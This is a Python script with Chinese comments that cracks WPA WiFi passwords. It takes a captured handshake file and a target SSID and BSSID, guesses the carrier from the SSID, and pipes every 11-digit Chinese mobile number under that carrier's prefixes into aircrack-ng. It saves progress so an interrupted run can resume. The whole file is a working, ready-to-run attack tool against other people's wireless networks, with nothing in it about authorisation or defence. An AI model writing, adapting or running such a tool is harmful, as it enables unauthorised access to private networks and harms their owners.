import subprocess
import os
import sys
import random
import time
import shutil
import json
import datetime

# --- 全局配置 ---
SAVE_FILE = "session_save.json"  # 进度存档文件
ISP_RULES = {
    "ChinaMobile": {
        "prefixes": ["134", "135", "136", "137", "138", "139", "147", "150", "151", "152", "157", "158", "159", "178", "182", "183", "184", "187", "188", "195", "197", "198"]
    },
    "ChinaTelecom": {
        "prefixes": ["133", "149", "153", "173", "177", "180", "181", "189", "190", "191", "193", "199"]
    },
    "ChinaUnicom": {
        "prefixes": ["130", "131", "132", "145", "155", "156", "166", "175", "176", "185", "186"]
    }
}

# 颜色
G = '\033[92m'
R = '\033[91m'
Y = '\033[93m'
B = '\033[94m'
W = '\033[0m'

def clean_path_input(path_str):
    if not path_str: return ""
    return path_str.strip().strip('"\' ')

def check_tools():
    if shutil.which("aircrack-ng") is None:
        print(f"{R}[!] 缺少 aircrack-ng{W}")
        sys.exit(1)

def get_cap_file():
    current_dir = os.getcwd()
    files = [f for f in os.listdir(current_dir) if f.endswith(".cap")]
    if not files:
        raw = input(f"请拖入 .cap 文件: ")
        path = clean_path_input(raw)
        if os.path.exists(path): return path
        sys.exit()
    
    print(f"\n{G}--- 发现抓包文件 ---{W}")
    for i, f in enumerate(files):
        print(f"{i}: {f}")
    
    raw_idx = input(f"{Y}请选择序号或拖入新文件: {W}")
    cleaned_input = clean_path_input(raw_idx)
    
    if cleaned_input.isdigit() and int(cleaned_input) < len(files):
        return files[int(cleaned_input)]
    elif os.path.exists(cleaned_input):
        return cleaned_input
    sys.exit()

def identify_prefixes(ssid):
    # 简单识别逻辑
    ssid_upper = ssid.upper()
    if "CMCC" in ssid_upper or "MOBILE" in ssid_upper:
        return ISP_RULES["ChinaMobile"]["prefixes"]
    if "CHINANET" in ssid_upper or "TELECOM" in ssid_upper:
        return ISP_RULES["ChinaTelecom"]["prefixes"]
    if "UNICOM" in ssid_upper:
        return ISP_RULES["ChinaUnicom"]["prefixes"]
    
    # 无法识别则返回所有
    all_p = []
    for r in ISP_RULES.values():
        all_p.extend(r["prefixes"])
    return all_p

def save_state(bssid, pending_prefixes, current_prefix, pending_high_blocks):
    """保存当前进度到 JSON 文件"""
    state = {
        "target_bssid": bssid,
        "pending_prefixes": pending_prefixes,
        "current_prefix": current_prefix,
        "pending_high_blocks": pending_high_blocks,
        "timestamp": str(datetime.datetime.now())
    }
    with open(SAVE_FILE, 'w') as f:
        json.dump(state, f)
    print(f"\n{G}[*] 进度已保存! 下次运行将自动继续。{W}")

def load_state():
    """读取存档"""
    if os.path.exists(SAVE_FILE):
        try:
            with open(SAVE_FILE, 'r') as f:
                return json.load(f)
        except:
            return None
    return None

def run_crack(cap_file, ssid, bssid):
    # 1. 尝试读取存档
    state = load_state()
    
    pending_prefixes = []
    current_prefix = None
    pending_high_blocks = []
    
    # 只有当存档里的 BSSID 和当前输入的一致时，才恢复进度
    if state and state.get("target_bssid") == bssid:
        print(f"{G}[*] 检测到上次未完成的进度，正在恢复...{W}")
        pending_prefixes = state["pending_prefixes"]
        current_prefix = state["current_prefix"]
        pending_high_blocks = state["pending_high_blocks"]
    else:
        print(f"{Y}[*] 开始新的破解任务...{W}")
        # 获取初始号段列表并打乱
        pending_prefixes = identify_prefixes(ssid)
        random.shuffle(pending_prefixes)
        current_prefix = None
        pending_high_blocks = []

    # 启动 Aircrack
    cmd = ["sudo", "aircrack-ng", "-w", "-", "-b", bssid, cap_file]
    process = subprocess.Popen(cmd, stdin=subprocess.PIPE, text=True)

    start_time = time.time()
    total_checked = 0

    try:
        # --- 主循环：处理每一个号段 ---
        # 如果当前正在跑某个号段(current_prefix)，先把它跑完
        # 如果是新任务，current_prefix 是 None，直接进入 while 循环取下一个
        
        while current_prefix or pending_prefixes:
            
            # 如果当前没有号段在跑，就从队列里取一个新的
            if not current_prefix:
                if not pending_prefixes:
                    break # 全部跑完了
                current_prefix = pending_prefixes.pop(0) # 取出一个
                # 生成该号段的 0000-9999 高位块，并洗牌
                pending_high_blocks = list(range(10000))
                random.shuffle(pending_high_blocks)
            
            # 计算剩余工作量 (用于进度条)
            # 剩余号段数 * 1亿 + 当前号段剩余高位块 * 1万
            total_remaining = (len(pending_prefixes) * 100000000) + (len(pending_high_blocks) * 10000)
            
            print(f"\n{B}=== 正在轰炸号段: {current_prefix} (剩余号段: {len(pending_prefixes)}) ==={W}")

            # --- 子循环：处理当前号段的高位块 ---
            # 使用 while 循环配合 pop，这样每做完一个块，列表中就少一个
            # 方便随时存档
            while pending_high_blocks:
                high = pending_high_blocks.pop(0) # 取出一个高位块 (0000-9999)
                
                # 实时显示进度
                elapsed = time.time() - start_time
                speed = total_checked / elapsed if elapsed > 0 else 0
                eta = total_remaining / speed if speed > 0 else 0
                eta_str = str(datetime.timedelta(seconds=int(eta)))
                
                print(f"\r{Y}[跑得飞起] 速度: {int(speed)}/s | 剩余: {total_remaining} | 预计时间: {eta_str} | 当前: {current_prefix}-{high:04d}-xxxx {W}", end="")
                
                # 生成低位块 (每次都随机生成，不需要存盘，因为丢了也只损失10000个尝试，不痛不痒)
                low_parts = list(range(10000))
                random.shuffle(low_parts)
                
                buffer = []
                for low in low_parts:
                    # 组合密码：前缀 + 高4位 + 低4位
                    password = f"{current_prefix}{high:04d}{low:04d}\n"
                    buffer.append(password)
                    
                    if len(buffer) >= 2000:
                        try:
                            process.stdin.write("".join(buffer))
                            process.stdin.flush()
                            total_checked += 2000
                            total_remaining -= 2000
                            buffer = []
                        except BrokenPipeError:
                            print(f"\n\n{G}[!!!] 恭喜！密码可能已经找到了！程序结束。{W}")
                            # 找到密码后，删除存档文件
                            if os.path.exists(SAVE_FILE): os.remove(SAVE_FILE)
                            return

                # 处理剩余 buffer
                if buffer:
                    try:
                        process.stdin.write("".join(buffer))
                        process.stdin.flush()
                        total_checked += len(buffer)
                    except BrokenPipeError:
                        print(f"\n\n{G}[!!!] 恭喜！密码可能已经找到了！程序结束。{W}")
                        if os.path.exists(SAVE_FILE): os.remove(SAVE_FILE)
                        return

            # 当一个号段跑完（pending_high_blocks 空了），置空当前号段，准备下一轮
            current_prefix = None
            # 这里的状态：pending_prefixes 还没动，current_prefix 空了
            # 这是一个安全的“保存点”

    except KeyboardInterrupt:
        print(f"\n\n{R}[!] 用户暂停！正在保存进度...{W}")
        # 如果是在子循环里中断，把刚才正在跑的 high 塞回去，下次重跑这个块，确保不漏
        if current_prefix and 'high' in locals():
             # 虽然这一小块跑了一半，但为了安全起见，下次这 10000 个重跑一次
             pending_high_blocks.insert(0, high)
             
        save_state(bssid, pending_prefixes, current_prefix, pending_high_blocks)
        sys.exit()
    finally:
        try: process.terminate()
        except: pass

def main():
    check_tools()
    
    # 获取参数
    cap_file = get_cap_file()
    
    # 尝试读取存档里的配置作为默认值
    saved_state = load_state()
    default_ssid = ""
    default_bssid = ""
    
    if saved_state:
        print(f"{G}[*] 发现存档文件。{W}")
        default_bssid = saved_state.get("target_bssid", "")
        print(f"{Y}上次的目标 BSSID 是: {default_bssid}{W}")
    
    ssid = input(f"请输入目标 WiFi 名称 (SSID): ").strip()
    bssid = input(f"请输入目标 MAC (BSSID) [默认:{default_bssid}]: ").strip()
    
    if not bssid and default_bssid:
        bssid = default_bssid
    
    if not bssid:
        print(f"{R}必须输入 BSSID！{W}")
        sys.exit()

    run_crack(cap_file, ssid, bssid)

if __name__ == "__main__":
    main()
